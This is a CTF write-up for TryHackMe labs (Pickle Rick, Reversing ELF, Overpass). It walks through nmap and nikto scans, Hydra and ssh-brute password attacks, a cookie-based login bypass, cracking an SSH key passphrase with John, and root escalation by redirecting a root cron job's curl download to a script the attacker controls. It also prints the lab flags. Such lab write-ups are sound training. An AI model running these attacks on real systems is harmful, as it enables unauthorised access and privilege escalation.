# TryHackMe

## Pickle Rick

Starting with ``` nmap -A -T5 <MACHINE_IP>``` we find _ssh_ open on port 22 and a _http_ webserver on port (80), both were expected. 


## Reversing ELF

First 3 were easily solvable with just the strings command.

crackme4 can be solved with <code>ltrace</code> or using <code>gdb</code> 
```
1) info functions
2) breakpoint at strcmp
3) run test
4) show rax and rdx strings with x/s 
```

the rest of them can be solved by decompiling with <code>ghidra</code> and then looking at the main function to reverse.

## Overpass
``` bash
nmap -v <MACHINE_IP>
```
Shows SSH on port 22 and an webpage on port 80. After that:

``` bash
nmap -v --script=ssh-brute <MACHINE_IP>
```

Doesn't manage to brute-froce the credentials.

``` bash
nikto -host <MACHINE_IP>
```

![Capture](https://user-images.githubusercontent.com/52963102/128154609-d44f494b-691b-4f93-84ad-0676e53ca06f.PNG)

...and on <code><MACHINE_IP>/admin</code> we find a login page. After setting up Burp-Suite for TryHackMe and examining the source code of the webpage I end up with a POST request curl command
	
``` bash
curl -X POST -F "username=admin" -F "password=passwd" http:/<MACHINE_IP>/api/login
```
	
with a failed response of <code>Incorrect credentials</code>, so next up we used Hydra with the following command
	
``` bash
hydra -vV -l admin -P /root/Desktop/Tools/wordlists/rockyou.txt <MACHINE_IP> http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect credentials"	
```
Still doesn't help us even after using the names as usernames from the About Us page. So I end up looking at the <code>login.js</code> file and the <code>login()</code> function, I highlighted the important part

![Capture](https://user-images.githubusercontent.com/52963102/128165302-1c3da5e3-e644-4fbc-b37f-b885b2b9bef8.PNG)

After setting the cookie <code>SessionToken</code> we get a new page with an RSA private key. Save it in a file named <code>id_rsa</code> then get <code>ssh2john.py</code> with:
	
``` bash
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py	
```
	
...and then run

``` bash
python3 ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash 
```

We get <code>id_rsa:james13</code>. From the text we know that this is an SSH key so we can try...
	
``` bash
ssh -i id_rsa james@<MACHINE_IP>
```
...and use <code>james13</code> as the passphrase. From there ```ls```  and we get the <code>user.txt</code> file.
	
<code>thm{65c1aaf000506e56996822c6281e6bf7}</code>

Next we need to somehow get into the <code>root</code> folder.
	
Skipping the LinPEAS part for now...
	
With ``` cat /etc/crontab ```  we can see that there is a suspicious curl command running. We can exploit it by changing the ``` overpass.thm ```  domain name with ``` vim /etc/hosts ```  to our own system and then create the same directory with a ``` buildscript.sh ``` file in it which has the lines ``` chmod 777 /root ``` and ``` chmod 777 /root/root.txt ```. (definitely not the best way of doing it)

<code>thm{7f336f8c359dbac18d54fdd64ea753bb}</code>
